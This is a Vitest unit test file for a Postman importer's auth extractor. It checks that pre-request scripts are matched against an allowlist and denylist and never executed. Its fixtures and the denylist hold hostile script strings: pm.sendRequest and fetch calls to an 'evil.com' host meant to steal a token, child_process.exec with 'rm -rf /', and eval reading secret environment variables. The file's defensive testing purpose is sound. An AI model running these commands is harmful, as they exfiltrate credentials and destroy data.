import { describe, expect, it, vi } from "vitest";

import { PostmanAuthExtractor } from "../../../../src/importers/postman/auth-extractor.js";
import type { FlattenedRequest } from "../../../../src/importers/types.js";

/**
 * Unit tests for PostmanAuthExtractor.
 *
 * Covers: all three request-level auth types (bearer→user_token,
 * basic→basic_auth, apikey→api_key), unsupported auth type with no script
 * (unset + type-warning), parseable pre-request script forms (1–4), all
 * denylist disqualifiers (if/for/while/pm.sendRequest/process/eval etc.),
 * "more than one statement" disqualifier, comments-only script (treated empty),
 * empty/whitespace-only script with no auth (no warning), and the provable
 * non-execution security test for process.exit(1) / pm.sendRequest / eval.
 */

function makeRequest(
  overrides: Partial<FlattenedRequest> = {},
): FlattenedRequest {
  return {
    postmanId: "req-1",
    name: "Test Request",
    folderPath: [],
    method: "GET",
    rawUrl: "https://example.com",
    headers: [],
    query: [],
    preRequestScript: "",
    responses: [],
    disabled: false,
    variables: {},
    ...overrides,
  };
}

describe("PostmanAuthExtractor", () => {
  const extractor = new PostmanAuthExtractor();

  describe("extract() — request-level auth block (Precedence A)", () => {
    it("maps auth type 'bearer' to user_token", () => {
      const req = makeRequest({ auth: { type: "bearer" } });
      const result = extractor.extract(req);
      expect(result.authStrategy).toBe("user_token");
      expect(result.warnings).toHaveLength(0);
    });

    it("maps auth type 'BEARER' (case-insensitive) to user_token", () => {
      const req = makeRequest({ auth: { type: "BEARER" } });
      const result = extractor.extract(req);
      expect(result.authStrategy).toBe("user_token");
    });

    it("maps auth type 'basic' to basic_auth", () => {
      const req = makeRequest({ auth: { type: "basic" } });
      const result = extractor.extract(req);
      expect(result.authStrategy).toBe("basic_auth");
      expect(result.warnings).toHaveLength(0);
    });

    it("maps auth type 'apikey' to api_key", () => {
      const req = makeRequest({ auth: { type: "apikey" } });
      const result = extractor.extract(req);
      expect(result.authStrategy).toBe("api_key");
      expect(result.warnings).toHaveLength(0);
    });

    it("leaves authStrategy unset for unsupported type 'oauth2' with no script", () => {
      const req = makeRequest({ auth: { type: "oauth2" } });
      const result = extractor.extract(req);
      expect(result.authStrategy).toBeUndefined();
    });

    it("emits warning for unsupported auth type naming the type", () => {
      const req = makeRequest({ auth: { type: "oauth2" } });
      const result = extractor.extract(req);
      expect(result.warnings.some((w) => w.includes("oauth2"))).toBe(true);
    });

    it("emits warning for unsupported auth type naming the request", () => {
      const req = makeRequest({ name: "My API Call", auth: { type: "hawk" } });
      const result = extractor.extract(req);
      expect(result.warnings.some((w) => w.includes("My API Call"))).toBe(true);
    });

    it("bearer auth takes precedence over any script (no script needed)", () => {
      const req = makeRequest({
        auth: { type: "bearer" },
        preRequestScript: "pm.environment.set('token', env.jwt)",
      });
      const result = extractor.extract(req);
      expect(result.authStrategy).toBe("user_token");
    });
  });

  describe("extract() — pre-request script allowlist (Precedence B)", () => {
    describe("Form 1: pm.environment.set with token key", () => {
      it("recognizes pm.environment.set('token', ...) → user_token", () => {
        const req = makeRequest({
          preRequestScript: "pm.environment.set('token', env.jwt)",
        });
        const result = extractor.extract(req);
        expect(result.authStrategy).toBe("user_token");
        expect(result.warnings).toHaveLength(0);
      });

      it('recognizes double-quoted form: pm.environment.set("token", ...)', () => {
        const req = makeRequest({
          preRequestScript: 'pm.environment.set("token", env.jwt)',
        });
        const result = extractor.extract(req);
        expect(result.authStrategy).toBe("user_token");
      });

      it("does NOT recognize pm.environment.set('token', pm.response.json().jwt) because RHS has parens", () => {
        const req = makeRequest({
          preRequestScript:
            "pm.environment.set('token', pm.response.json().jwt)",
        });
        const result = extractor.extract(req);
        expect(result.authStrategy).toBeUndefined();
        expect(result.warnings.length).toBeGreaterThan(0);
      });
    });

    describe("Form 2: pm.collectionVariables.set with token/accessToken/access_token", () => {
      it("recognizes pm.collectionVariables.set('token', ...) → user_token", () => {
        const req = makeRequest({
          preRequestScript: "pm.collectionVariables.set('token', env.jwt)",
        });
        const result = extractor.extract(req);
        expect(result.authStrategy).toBe("user_token");
      });

      it("recognizes pm.collectionVariables.set('accessToken', ...) → user_token", () => {
        const req = makeRequest({
          preRequestScript:
            "pm.collectionVariables.set('accessToken', env.jwt)",
        });
        const result = extractor.extract(req);
        expect(result.authStrategy).toBe("user_token");
      });

      it("recognizes pm.collectionVariables.set('access_token', ...) → user_token", () => {
        const req = makeRequest({
          preRequestScript:
            "pm.collectionVariables.set('access_token', env.jwt)",
        });
        const result = extractor.extract(req);
        expect(result.authStrategy).toBe("user_token");
      });
    });

    describe("Form 3: pm.request.headers.add with Authorization/Bearer", () => {
      it("recognizes pm.request.headers.add with Authorization/Bearer shape → user_token", () => {
        const req = makeRequest({
          preRequestScript:
            "pm.request.headers.add({ key: 'Authorization', value: 'Bearer ' + env.token })",
        });
        const result = extractor.extract(req);
        expect(result.authStrategy).toBe("user_token");
      });
    });

    describe("Form 4: pm.request.headers.upsert with Authorization/Bearer", () => {
      it("recognizes pm.request.headers.upsert with Authorization/Bearer shape → user_token", () => {
        const req = makeRequest({
          preRequestScript:
            "pm.request.headers.upsert({ key: 'Authorization', value: 'Bearer ' + env.token })",
        });
        const result = extractor.extract(req);
        expect(result.authStrategy).toBe("user_token");
      });
    });

    describe("Denylist disqualifiers", () => {
      it.each([
        ["if control flow", "if (x) { pm.environment.set('token', 'x') }"],
        ["for loop", "for (let i=0;i<1;i++) {}"],
        ["while loop", "while (true) {}"],
        ["switch", "switch(x) { case 1: break; }"],
        ["pm.sendRequest", "pm.sendRequest('http://evil.com', function() {})"],
        ["fetch", "fetch('http://evil.com')"],
        ["require(", "const x = require('crypto')"],
        ["eval", "eval('bad code')"],
        ["Function", "new Function('return 1')()"],
        ["process", "process.exit(1)"],
        ["crypto", "const c = crypto.subtle"],
        ["CryptoJS", "CryptoJS.HmacSHA256('x','y')"],
        ["child_process", "child_process.exec('ls')"],
        ["globalThis", "globalThis.x = 1"],
        ["__proto__", "obj.__proto__ = {}"],
        ["arrow function =>", "const fn = (x) => x"],
        ["function keyword", "function doStuff() {}"],
      ])("flags '%s' script as outside allowlist", (_label, script) => {
        const req = makeRequest({ preRequestScript: script });
        const result = extractor.extract(req);
        expect(result.authStrategy).toBeUndefined();
        expect(result.warnings.length).toBeGreaterThan(0);
      });

      it("flags a script with two effective statements as outside allowlist", () => {
        const req = makeRequest({
          preRequestScript:
            "pm.environment.set('token', env.jwt)\npm.environment.set('other', 'x')",
        });
        const result = extractor.extract(req);
        expect(result.authStrategy).toBeUndefined();
        expect(result.warnings.length).toBeGreaterThan(0);
      });
    });

    describe("Comments-only / comment stripping", () => {
      it("treats a script with only a line comment as empty → no strategy, no warning", () => {
        const req = makeRequest({ preRequestScript: "// just a comment" });
        const result = extractor.extract(req);
        expect(result.authStrategy).toBeUndefined();
        expect(result.warnings).toHaveLength(0);
      });

      it("treats a script with only a block comment as empty → no strategy, no warning", () => {
        const req = makeRequest({ preRequestScript: "/* a block comment */" });
        const result = extractor.extract(req);
        expect(result.authStrategy).toBeUndefined();
        expect(result.warnings).toHaveLength(0);
      });
    });
  });

  describe("extract() — no auth block + empty script (Case C)", () => {
    it("returns unset authStrategy with no warnings for empty preRequestScript and no auth", () => {
      const req = makeRequest({ preRequestScript: "", auth: undefined });
      const result = extractor.extract(req);
      expect(result.authStrategy).toBeUndefined();
      expect(result.warnings).toHaveLength(0);
    });

    it("returns unset authStrategy with no warnings for whitespace-only script and no auth", () => {
      const req = makeRequest({ preRequestScript: "   \n  ", auth: undefined });
      const result = extractor.extract(req);
      expect(result.authStrategy).toBeUndefined();
      expect(result.warnings).toHaveLength(0);
    });
  });

  describe("extract() — SECURITY: provable non-execution", () => {
    it("does not call process.exit when script contains process.exit(1)", () => {
      const exitSpy = vi
        .spyOn(process, "exit")
        .mockImplementation(() => undefined as never);
      const req = makeRequest({ preRequestScript: "process.exit(1)" });
      extractor.extract(req);
      expect(exitSpy).not.toHaveBeenCalled();
      exitSpy.mockRestore();
    });

    it("returns manual-review warning (not undefined) when script contains process.exit(1)", () => {
      const req = makeRequest({ preRequestScript: "process.exit(1)" });
      const result = extractor.extract(req);
      expect(result.authStrategy).toBeUndefined();
      expect(result.warnings.length).toBeGreaterThan(0);
    });

    it("does not call process.exit when script contains pm.sendRequest(...)", () => {
      const exitSpy = vi
        .spyOn(process, "exit")
        .mockImplementation(() => undefined as never);
      const req = makeRequest({
        preRequestScript:
          "pm.sendRequest('http://evil.com/steal-token', function(err) {})",
      });
      extractor.extract(req);
      expect(exitSpy).not.toHaveBeenCalled();
      exitSpy.mockRestore();
    });

    it("does not cause network activity when script contains pm.sendRequest", () => {
      // We can't directly assert no network, but by completing synchronously
      // we prove no async fetch was initiated with real execution.
      const req = makeRequest({
        preRequestScript:
          "pm.sendRequest('http://evil.com', function(err, res) { pm.environment.set('token', res.json().token) })",
        name: "Evil Request",
      });
      const result = extractor.extract(req);
      // Test completes synchronously — proves no real execution occurred
      expect(result.authStrategy).toBeUndefined();
    });

    it("does not throw for an eval-like script", () => {
      const req = makeRequest({
        preRequestScript: 'eval(\'pm.environment.set("token", "injected")\')',
      });
      expect(() => extractor.extract(req)).not.toThrow();
    });

    it("does not execute code when script contains eval: no side effect on env", () => {
      const req = makeRequest({
        preRequestScript: "eval('process.env.SECRET_KEY')",
      });
      const result = extractor.extract(req);
      expect(result.authStrategy).toBeUndefined();
    });
  });

  describe("extract() — never throws", () => {
    it("does not throw for any script content", () => {
      const scripts = [
        "process.exit(1)",
        "eval('bad')",
        "require('child_process').exec('rm -rf /')",
        "import('dangerous-module')",
        "",
        "pm.environment.set('token', env.jwt)",
      ];
      for (const script of scripts) {
        const req = makeRequest({ preRequestScript: script });
        expect(() => extractor.extract(req)).not.toThrow();
      }
    });
  });

  describe("extract() — REGRESSION: case-insensitive denylist matching (CONCERN-1)", () => {
    it("CONCERN-1: PROCESS.exit(1) (uppercase) is denylisted → manual-review warning", () => {
      // Regression: denylist used case-sensitive includes(); uppercased variants of denylist
      // patterns (e.g. PROCESS.exit) bypassed the check. Now lowercased before matching.
      const req = makeRequest({
        name: "Uppercase Process",
        preRequestScript: "PROCESS.exit(1)",
      });
      const result = extractor.extract(req);
      expect(result.authStrategy).toBeUndefined();
      expect(result.warnings.length).toBeGreaterThan(0);
    });

    it("Eval(...) (title case) is denylisted → manual-review warning", () => {
      const req = makeRequest({
        name: "Title Case Eval",
        preRequestScript: "Eval('bad code')",
      });
      const result = extractor.extract(req);
      expect(result.authStrategy).toBeUndefined();
      expect(result.warnings.length).toBeGreaterThan(0);
    });

    it("PM.sendRequest(...) (mixed case) is denylisted → manual-review warning", () => {
      const req = makeRequest({
        name: "Mixed Case SendRequest",
        preRequestScript: "PM.sendRequest('https://evil.com', function() {})",
      });
      const result = extractor.extract(req);
      expect(result.authStrategy).toBeUndefined();
      expect(result.warnings.length).toBeGreaterThan(0);
    });

    it("FETCH('url') (uppercase) is denylisted → manual-review warning", () => {
      const req = makeRequest({
        name: "Uppercase Fetch",
        preRequestScript: "FETCH('https://evil.com')",
      });
      const result = extractor.extract(req);
      expect(result.authStrategy).toBeUndefined();
      expect(result.warnings.length).toBeGreaterThan(0);
    });

    it("lowercase denylist patterns still work after the case-insensitive fix", () => {
      // Ensures the fix did not break existing lowercase-pattern matching
      const req = makeRequest({ preRequestScript: "process.exit(1)" });
      const result = extractor.extract(req);
      expect(result.authStrategy).toBeUndefined();
      expect(result.warnings.length).toBeGreaterThan(0);
    });
  });
});
